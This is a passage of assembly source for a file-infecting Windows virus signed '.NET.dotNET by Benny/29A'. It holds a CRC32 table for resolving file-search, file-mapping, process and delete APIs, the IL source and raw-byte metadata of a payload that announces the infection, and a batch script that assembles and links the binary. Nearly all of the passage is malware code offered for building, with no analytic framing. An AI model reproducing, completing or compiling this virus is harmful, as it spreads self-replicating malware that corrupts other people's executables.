un_csum:push	esi
	call	[ebp + a_FreeLibrary - gdelta]
q_ucf:	ret
CalcCheckSum	EndP

signature		db	0,'.NET.dotNET by Benny/29A',0



crc32s:			dd	042F13D06h		;GetVersion
			dd	0593AE7CEh		;GetSystemDirectoryA
			dd	0AE17EBEFh		;FindFirstFileA
			dd	0AA700106h		;FindNextFileA
			dd	0C200BE21h		;FindClose
			dd	08C892DDFh		;CreateFileA
			dd	096B2D96Ch		;CreateFileMappingA
			dd	0797B49ECh		;MapViewOfFile
			dd	094524B42h		;UnmapViewOfFile
			dd	068624A9Dh		;CloseHandle
			dd	03C19E536h		;SetFileAttributesA
			dd	0EBC6C18Bh		;GetCurrentDirectoryA
			dd	0B2DBD7DCh		;SetCurrentDirectoryA
			dd	04134D1ADh		;LoadLibraryA
			dd	0FFC97C1Fh		;GetProcAddress
			dd	0AFDF191Fh		;FreeLibrary
			dd	085859D42h		;SetFilePointer
			dd	059994ED6h		;SetEndOfFile
			dd	004DCF392h		;GetModuleFileNameA
			dd	05BD05DB1h		;CopyFileA
			dd	0267E0B05h		;CreateProcessA
			dd	03921BF03h		;GetCommandLineA
			dd	0D4540229h		;WaitForSingleObject
			dd	0DE256FDEh		;DeleteFileA
crc32c = ($-crc32s)/4					;number of APIz


;Here is the source code of the .NET program... (written in MS intermedial language)

COMMENT &

.module extern user32
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )
  .ver 1:0:2411:0
}
.assembly dotnet
{
  .hash algorithm 0x00008004
  .ver 0:0:0:0
}
.module dotnet.exe
.imagebase 0x00400000
.subsystem 0x00000002
.file alignment 512
.corflags 0x00000001
.class private auto ansi beforefieldinit dotNET
       extends [mscorlib]System.Object
{

  //declare external method (API)

  .method public hidebysig static pinvokeimpl("user32" winapi) 
          void  MessageBoxA(int32 h,
                            string m,
                            string c,
                            int32 type) cil managed preservesig
  {
  }
  .method public hidebysig static void  Main() cil managed
  {
    .entrypoint
    .maxstack  4
    .locals (class [mscorlib]System.Random V_0)

    // call constructor of System.Random class

    IL_0000:  newobj     instance void [mscorlib]System.Random::.ctor()
    IL_0005:  stloc.0
    IL_0006:  ldloc.0

    // call Next() method of System.Random class

    IL_0007:  callvirt   instance int32 [mscorlib]System.Random::Next()
    IL_000c:  ldc.i4.s   10
    IL_000e:  rem
    IL_000f:  brtrue.s   IL_0022	// quit if not matches

    // 1:10 chance the dialog will be displayed

    IL_0011:  ldc.i4.0
    IL_0012:  ldstr      "This cell has been infected by dotNET virus!"
    IL_0017:  ldstr      ".NET.dotNET by Benny/29A"
    IL_001c:  ldc.i4.0
    IL_001d:  call       void dotNET::MessageBoxA(int32,
                                                  string,
                                                  string,
                                                  int32)
    // quit program :)

    IL_0022:  ret
  }
}

&

;and here is stored the code (above) in binary form

meta_code:		include	metacode.inc	;viral metadata record
meta_end:
stored_meta_code:	include metacode.inc	;buffer for hosts metadata record


virus_end:

a_apis:
a_GetVersion		dd	?
a_GetSystemDirectoryA	dd	?
a_FindFirstFileA	dd	?
a_FindNextFileA		dd	?
a_FindClose		dd	?
a_CreateFileA		dd	?
a_CreateFileMappingA	dd	?
a_MapViewOfFile		dd	?
a_UnmapViewOfFile	dd	?
a_CloseHandle		dd	?
a_SetFileAttributesA	dd	?
a_GetCurrentDirectoryA	dd	?
a_SetCurrentDirectoryA	dd	?
a_LoadLibraryA		dd	?
a_GetProcAddress	dd	?
a_FreeLibrary		dd	?
a_SetFilePointer	dd	?
a_SetEndOfFile		dd	?
a_GetModuleFileNameA	dd	?
a_CopyFileA		dd	?
a_CreateProcessA	dd	?
a_GetCommandLineA	dd	?
a_WaitForSingleObject	dd	?
a_DeleteFileA		dd	?

WFD		WIN32_FIND_DATA	?
prev_dir		db	MAX_PATH dup (?)
host_name = prev_dir
new_host_name		db	2*MAX_PATH+2 dup (?)

lpProcInfo		dd	4 dup (?)
lpStartupInfo		dd	72 dup (?)


virtual_end:

extrn	ExitProcess:PROC	;that's becoz of buggy linker
End	Start
���������������������������������������������������������������[DOTNET.ASM]���
�������������������������������������������������������������[METACODE.INC]���
		db 48h,	3 dup(0), 2, 3 dup(0)
		db 84h,	20h, 2 dup(0), 0E0h
		db 2, 2	dup(0),	1, 3 dup(0)
		db 2, 2	dup(0),	6, 30h dup(0)
		db 2, 3	dup(0),	3, 30h,	4
		db 0, 23h, 3 dup(0), 1,	2 dup(0)
		db 11h,	73h, 1,	2 dup(0), 2 dup(0Ah)
		db 6, 6Fh, 2, 2	dup(0),	0Ah
		db 1Fh,	0Ah, 5Dh, 2Dh, 11h
		db 16h,	72h, 1,	2 dup(0), 70h
		db 72h,	5Bh, 2 dup(0), 70h
		db 16h,	28h, 1,	2 dup(0), 6
		db 2Ah,	0, 42h,	53h, 4Ah, 42h
		db 1, 0, 1, 5 dup(0), 0Ch
		db 3 dup(0), 76h, 31h, 2Eh
		db 30h,	2Eh, 32h, 39h, 31h
		db 34h,	5 dup(0), 5, 0,	6Ch
		db 3 dup(0), 0F0h, 3 dup(0)
		db 23h,	7Eh, 2 dup(0), 5Ch
		db 1, 2	dup(0),	0C0h, 3	dup(0)
		db 23h,	53h, 74h, 72h, 69h
		db 6Eh,	67h, 73h, 4 dup(0)
		db 1Ch,	2, 2 dup(0), 90h, 3 dup(0)
		db 23h,	55h, 53h, 0, 0ACh
		db 2, 2	dup(0),	10h, 3 dup(0)
		db 23h,	47h, 55h, 49h, 44h
		db 3 dup(0), 0BCh, 2, 2	dup(0)
		db 24h,	3 dup(0), 23h, 42h
		db 6Ch,	6Fh, 62h, 7 dup(0)
		db 1, 2	dup(0),	1, 47h,	5
		db 2, 14h, 9, 4	dup(0),	0FAh
		db 1, 33h, 0, 2, 2 dup(0)
		db 1, 3	dup(0),	2, 3 dup(0)
		db 2, 3	dup(0),	2, 3 dup(0)
		db 4, 3	dup(0),	2, 3 dup(0)
		db 1, 3	dup(0),	1, 3 dup(0)
		db 1, 3	dup(0),	1, 3 dup(0)
		db 1, 5	dup(0),	6Fh, 0,	1
		db 5 dup(0), 6,	0, 81h,	0
		db 7Ah,	0, 6, 0, 8Fh, 0
		db 7Ah,	5 dup(0), 44h, 5 dup(0)
		db 1, 0, 1, 3 dup(0), 10h
		db 0, 88h, 3 dup(0), 5,	0
		db 1, 0, 1, 5 dup(0), 80h
		db 0, 96h, 20h,	0A1h, 0, 17h
		db 0, 1, 0, 54h, 20h, 4	dup(0)
		db 96h,	0, 0B8h, 0, 1Fh, 0
		db 5, 3	dup(0),	1, 0, 0ADh
		db 3 dup(0), 2,	0, 0AFh, 3 dup(0)
		db 3, 0, 0B1h, 3 dup(0), 4
		db 0, 0B3h, 0, 11h, 0, 96h
		db 0, 0Ah, 0, 11h, 0, 9Ch
		db 0, 0Eh, 0, 12h, 0, 58h
		db 2 dup(0), 1,	3, 0, 0A1h
		db 0, 1, 0, 4, 80h, 10h	dup(0)
		db 68h,	3 dup(0), 1, 3 dup(0)
		db 6Bh,	9, 6 dup(0), 1,	0
		db 5Fh,	0Ah dup(0), 56h, 65h
		db 72h,	73h, 69h, 6Fh, 6Eh
		db 20h,	6Fh, 66h, 20h, 72h
		db 75h,	6Eh, 74h, 69h, 6Dh
		db 65h,	20h, 61h, 67h, 61h
		db 69h,	6Eh, 73h, 74h, 20h
		db 77h,	68h, 69h, 63h, 68h
		db 20h,	74h, 68h, 65h, 20h
		db 62h,	69h, 6Eh, 61h, 72h
		db 79h,	20h, 69h, 73h, 20h
		db 62h,	75h, 69h, 6Ch, 74h
		db 20h,	3Ah, 20h, 31h, 2Eh
		db 30h,	2Eh, 32h, 39h, 31h
		db 34h,	2Eh, 31h, 36h, 0, 3Ch
		db 4Dh,	6Fh, 64h, 75h, 6Ch
		db 65h,	3Eh, 0,	64h, 6Fh, 74h
		db 6Eh,	65h, 74h, 2Eh, 45h
		db 58h,	45h, 0,	75h, 73h, 65h
		db 72h,	33h, 32h, 0, 6Dh, 73h
		db 63h,	6Fh, 72h, 6Ch, 69h
		db 62h,	0, 64h,	6Fh, 74h, 6Eh
		db 65h,	74h, 0,	64h, 6Fh, 74h
		db 6Eh,	65h, 74h, 2Eh, 65h
		db 78h,	65h, 0,	53h, 79h, 73h
		db 74h,	65h, 6Dh, 0, 4Fh, 62h
		db 6Ah,	65h, 63h, 74h, 0, 64h
		db 6Fh,	74h, 4Eh, 45h, 54h
		db 0, 52h, 61h,	6Eh, 64h, 6Fh
		db 6Dh,	0, 2Eh,	63h, 74h, 6Fh
		db 72h,	0, 4Eh,	65h, 78h, 74h
		db 0, 4Dh, 65h,	2 dup(73h)
		db 61h,	67h, 65h, 42h, 6Fh
		db 78h,	41h, 0,	68h, 0,	6Dh
		db 0, 63h, 0, 74h, 79h,	70h
		db 65h,	0, 4Dh,	61h, 69h, 6Eh
		db 5 dup(0), 59h, 54h, 0, 68h
		db 0, 69h, 0, 73h, 0, 20h
		db 0, 63h, 0, 65h, 0, 6Ch
		db 0, 6Ch, 0, 20h, 0, 68h
		db 0, 61h, 0, 73h, 0, 20h
		db 0, 62h, 0, 65h, 0, 65h
		db 0, 6Eh, 0, 20h, 0, 69h
		db 0, 6Eh, 0, 66h, 0, 65h
		db 0, 63h, 0, 74h, 0, 65h
		db 0, 64h, 0, 20h, 0, 62h
		db 0, 79h, 0, 20h, 0, 64h
		db 0, 6Fh, 0, 74h, 0, 4Eh
		db 0, 45h, 0, 54h, 0, 20h
		db 0, 76h, 0, 69h, 0, 72h
		db 0, 75h, 0, 73h, 0, 21h
		db 2 dup(0), 31h, 2Eh, 0, 4Eh
		db 0, 45h, 0, 54h, 0, 2Eh
		db 0, 64h, 0, 6Fh, 0, 74h
		db 0, 4Eh, 0, 45h, 0, 54h
		db 0, 20h, 0, 62h, 0, 79h
		db 0, 20h, 0, 42h, 0, 65h
		db 0, 6Eh, 0, 6Eh, 0, 79h
		db 0, 2Fh, 0, 32h, 0, 39h
		db 0, 41h, 5 dup(0), 0EEh
		db 0D9h, 14h, 0EBh, 57h, 8Bh
		db 7Eh,	48h, 0A1h, 0C8h, 0A6h
		db 5, 38h, 6Bh,	6, 28h,	0
		db 8, 0B7h, 7Ah, 5Ch, 56h
		db 19h,	34h, 0E0h, 89h,	3
		db 20h,	0, 1, 3, 20h, 0
		db 8, 4, 7, 1, 12h, 9
		db 7, 0, 4, 1, 8, 2 dup(0Eh)
		db 8, 3, 2 dup(0), 1, 0
		db 8Ch,	23h
�������������������������������������������������������������[METACODE.INC]���
��������������������������������������������������������������[COMPILE.BAT]���
@echo off
d:\tasm5\bin\tasm32 -ml -m9 -q dotnet.asm
d:\tasm5\bin\tlink32 -Tpe -c -x -aa -r  dotnet,,, d:\tasm5\lib\import32
d:\tasm5\bin\PEWRSEC.COM dotnet.exe
del dotnet.obj
��������������������������������������������������������������[COMPILE.BAT]���